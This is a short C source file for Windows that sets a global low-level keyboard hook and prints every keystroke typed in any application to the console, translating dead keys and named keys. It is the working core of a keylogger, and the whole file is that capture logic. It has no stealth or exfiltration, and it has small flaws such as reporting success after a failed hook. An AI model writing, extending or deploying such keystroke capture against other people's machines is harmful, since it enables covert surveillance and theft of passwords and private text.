#include <windows.h>
#include <stdio.h>

const char* key_names[256] = {0};

void init_key_names() {
    key_names[VK_BACK]   = "[BACKSPACE]";
    key_names[VK_RETURN] = "[ENTER]";
    key_names[VK_SPACE]  = " ";
    key_names[VK_LSHIFT] = "[SHIFT]";
}

LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam){
    
    KBDLLHOOKSTRUCT  *pkey = (KBDLLHOOKSTRUCT *) lParam;
    const char* name = key_names[pkey->vkCode];

    if(wParam == WM_KEYDOWN){

        if (name) {
            printf("%s", name);
        
        } else {

        BYTE ks[256];
        GetKeyboardState(ks);

        WCHAR buf[5];

            int r = ToUnicode(
                pkey->vkCode,
                pkey->scanCode,
                ks,
                buf,
                4,
                0
            );

            if(r >= 0){
                for (int i = 0; i < r; i++) {
                    printf("%lc", buf[i]);
                }
            }
            else{
                // clear Windows’ internal dead-key buffer
                ToUnicode(pkey->vkCode, pkey->scanCode, ks, buf, 4, 0);
            }
        }
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}


int main(){

    init_key_names();

    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if(!hhook){
        printf("Error\n");
    }
    printf("Success\n");

    MSG msg;
    while ((GetMessage(&msg, NULL, 0, 0)) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

}
